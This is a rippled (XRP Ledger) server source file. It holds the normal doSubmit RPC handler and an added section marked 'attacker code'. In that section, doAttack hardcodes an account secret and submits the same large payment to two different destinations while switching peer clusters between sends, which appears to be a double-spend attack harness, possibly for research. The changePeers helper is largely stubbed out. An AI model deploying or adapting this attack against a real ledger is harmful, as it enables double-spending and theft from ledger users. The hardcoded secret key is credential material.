//------------------------------------------------------------------------------
/*
    This file is part of rippled: https://github.com/ripple/rippled
    Copyright (c) 2012-2014 Ripple Labs Inc.

    Permission to use, copy, modify, and/or distribute this software for any
    purpose  with  or without fee is hereby granted, provided that the above
    copyright notice and this permission notice appear in all copies.

    THE  SOFTWARE IS PROVIDED "AS IS" AND THE AUTHOR DISCLAIMS ALL WARRANTIES
    WITH  REGARD  TO  THIS  SOFTWARE  INCLUDING  ALL  IMPLIED  WARRANTIES  OF
    MERCHANTABILITY  AND  FITNESS. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR
    ANY  SPECIAL ,  DIRECT, INDIRECT, OR CONSEQUENTIAL DAMAGES OR ANY DAMAGES
    WHATSOEVER  RESULTING  FROM  LOSS  OF USE, DATA OR PROFITS, WHETHER IN AN
    ACTION  OF  CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
    OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
*/
//==============================================================================

#include <ripple/app/ledger/LedgerMaster.h>
#include <ripple/app/misc/HashRouter.h>
#include <ripple/app/misc/Transaction.h>
#include <ripple/app/misc/ValidatorList.h>
#include <ripple/app/tx/apply.h>
#include <ripple/net/RPCErr.h>
#include <ripple/protocol/ErrorCodes.h>
#include <ripple/resource/Fees.h>
#include <ripple/rpc/Context.h>
#include <ripple/rpc/impl/TransactionSign.h>

namespace ripple {

static NetworkOPs::FailHard getFailHard (RPC::Context const& context)
{
    return NetworkOPs::doFailHard (
        context.params.isMember ("fail_hard")
        && context.params["fail_hard"].asBool ());
}

// {
//   tx_json: <object>,
//   secret: <secret>
// }
Json::Value doSubmit (RPC::Context& context)
{
    context.loadType = Resource::feeMediumBurdenRPC;

    if (!context.params.isMember (jss::tx_blob))
    {
        auto const failType = getFailHard (context);

        if (context.role != Role::ADMIN && !context.app.config().canSign())
            return RPC::make_error (rpcNOT_SUPPORTED,
                "Signing is not supported by this server.");

        auto ret = RPC::transactionSubmit (
            context.params, failType, context.role,
            context.ledgerMaster.getValidatedLedgerAge(),
            context.app, RPC::getProcessTxnFn (context.netOps));

        ret[jss::deprecated] = "Signing support in the 'submit' command has been "
                               "deprecated and will be removed in a future version "
                               "of the server. Please migrate to a standalone "
                               "signing tool.";

        return ret;
    }

    Json::Value jvResult;

    auto ret = strUnHex (context.params[jss::tx_blob].asString ());

    if (!ret || !ret->size ())
        return rpcError (rpcINVALID_PARAMS);

    SerialIter sitTrans (makeSlice(*ret));

    std::shared_ptr<STTx const> stpTrans;

    try
    {
        stpTrans = std::make_shared<STTx const> (std::ref (sitTrans));
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]        = "invalidTransaction";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    {
        if (!context.app.checkSigs())
            forceValidity(context.app.getHashRouter(),
                stpTrans->getTransactionID(), Validity::SigGoodOnly);
        auto [validity, reason] = checkValidity(context.app.getHashRouter(),
            *stpTrans, context.ledgerMaster.getCurrentLedger()->rules(),
                context.app.config());
        if (validity != Validity::Valid)
        {
            jvResult[jss::error] = "invalidTransaction";
            jvResult[jss::error_exception] = "fails local checks: " + reason;

            return jvResult;
        }
    }

    std::string reason;
    auto tpTrans = std::make_shared<Transaction> (
        stpTrans, reason, context.app);
    if (tpTrans->getStatus() != NEW)
    {
        jvResult[jss::error]            = "invalidTransaction";
        jvResult[jss::error_exception] = "fails local checks: " + reason;

        return jvResult;
    }

    try
    {
        auto const failType = getFailHard (context);

        context.netOps.processTransaction (
            tpTrans, isUnlimited (context.role), true, failType);
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalSubmit";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    try
    {
        jvResult[jss::tx_json] = tpTrans->getJson (JsonOptions::none);
        jvResult[jss::tx_blob] = strHex (
            tpTrans->getSTransaction ()->getSerializer ().peekData ());

        if (temUNCERTAIN != tpTrans->getResult ())
        {
            std::string sToken;
            std::string sHuman;

            transResultInfo (tpTrans->getResult (), sToken, sHuman);

            jvResult[jss::engine_result]           = sToken;
            jvResult[jss::engine_result_code]      = tpTrans->getResult ();
            jvResult[jss::engine_result_message]   = sHuman;
        }

        return jvResult;
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalJson";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }
}

// Start attacker code

// {
//   tx_json: <object>,
//   secret: <secret>
// }
Json::Value doAttack (RPC::Context& context)
{
    auto j = context.app.journal ("Attack");
    JLOG (j.warn()) << "Starting doAttack";

    context.loadType = Resource::feeMediumBurdenRPC;

    changePeers(context, 0, j);

    if (!context.params.isMember (jss::tx_blob))
    {
        changePeers(context, 1, j);
        auto const failType = getFailHard (context);

        // import tx_json-field into context.params:
        Json::Value tx;
        tx[jss::Account] = "rfhWbXmBpxqjUWfqVv34t4pHJHs6YDFKCN";
        tx[jss::Amount] = "1000000000";
        tx[jss::Destination] = "rG1eMisac1neCXeZNPYmwV8sovo5vs9dnB";
        tx[jss::Fee] = "10";
        tx[jss::TransactionType] = "Payment";

        context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
        context.params[jss::tx_json] = tx;

        auto ret = RPC::transactionSubmitAttack (
            context.params, failType, context.role,
            context.ledgerMaster.getValidatedLedgerAge(),
            context.app, RPC::getProcessTxnFnAttack (context.netOps));
        
        tx[jss::Destination] = "rnkP5Tipm14sqpoDetQxrLjiyyKhk72eAi";
        context.params[jss::tx_json] = tx;

        changePeers(context, 2, j);

        ret = RPC::transactionSubmitAttack (
            context.params, failType, context.role,
            context.ledgerMaster.getValidatedLedgerAge(),
            context.app, RPC::getProcessTxnFnAttack (context.netOps));

        ret[jss::deprecated] = "Signing support in the 'submit' command has been "
                               "deprecated and will be removed in a future version "
                               "of the server. Please migrate to a standalone "
                               "signing tool.";

        return ret;
    }

    Json::Value jvResult;

    auto ret = strUnHex (context.params[jss::tx_blob].asString ());

    if (!ret || !ret->size ())
        return rpcError (rpcINVALID_PARAMS);

    SerialIter sitTrans (makeSlice(*ret));

    std::shared_ptr<STTx const> stpTrans;

    try
    {
        stpTrans = std::make_shared<STTx const> (std::ref (sitTrans));
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]        = "invalidTransaction";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    {
        if (!context.app.checkSigs())
            forceValidity(context.app.getHashRouter(),
                stpTrans->getTransactionID(), Validity::SigGoodOnly);
        auto [validity, reason] = checkValidity(context.app.getHashRouter(),
            *stpTrans, context.ledgerMaster.getCurrentLedger()->rules(),
                context.app.config());
        if (validity != Validity::Valid)
        {
            jvResult[jss::error] = "invalidTransaction";
            jvResult[jss::error_exception] = "fails local checks: " + reason;

            return jvResult;
        }
    }

    std::string reason;
    auto tpTrans = std::make_shared<Transaction> (
        stpTrans, reason, context.app);
    if (tpTrans->getStatus() != NEW)
    {
        jvResult[jss::error]            = "invalidTransaction";
        jvResult[jss::error_exception] = "fails local checks: " + reason;

        return jvResult;
    }

    try
    {
        auto const failType = getFailHard (context);

        context.netOps.processTransactionAttack (
            tpTrans, isUnlimited (context.role), true, failType);
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalSubmit";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }


    try
    {
        jvResult[jss::tx_json] = tpTrans->getJson (JsonOptions::none);
        jvResult[jss::tx_blob] = strHex (
            tpTrans->getSTransaction ()->getSerializer ().peekData ());

        if (temUNCERTAIN != tpTrans->getResult ())
        {
            std::string sToken;
            std::string sHuman;

            transResultInfo (tpTrans->getResult (), sToken, sHuman);

            jvResult[jss::engine_result]           = sToken;
            jvResult[jss::engine_result_code]      = tpTrans->getResult ();
            jvResult[jss::engine_result_message]   = sHuman;
        }

        return jvResult;
    }
    catch (std::exception& e)
    {
        jvResult[jss::error]           = "internalJson";
        jvResult[jss::error_exception] = e.what ();

        return jvResult;
    }
}

Json::Value changePeers (RPC::Context& context, int cluster_idx, beast::Journal j)
{
    JLOG (j.warn()) << "changePeers: currently " << context.app.overlay ().size() << " nodes.";
    
    Json::Value jvResult (Json::objectValue);
    jvResult[jss::peers] = context.app.overlay ().json ();

    // cluster_idx: 0 (all), 1 (1,2,3), 2 (4,5,6)
    assert(cluster_idx == -1 || cluster_idx == 0 || cluster_idx == 1 || cluster_idx == 2);
    if (cluster_idx == 0) {
        JLOG (j.warn()) << "changePeers: Use all nodes";
        auto peers = context.app.overlay ().getActivePeers();
        // peers.clear();
        for (auto& peer : peers) {
            if (peer) {
                JLOG (j.warn()) << "Peer active";
                // peer.getRemoteAddress();
            }
        }
        
    } else if (cluster_idx == -1) {
        JLOG (j.warn()) << "changePeers: Remove all nodes";
    } else {
        JLOG (j.warn()) << "changePeers to " << cluster_idx;
    }

    return jvResult;
}
// End attacker code

} // ripple
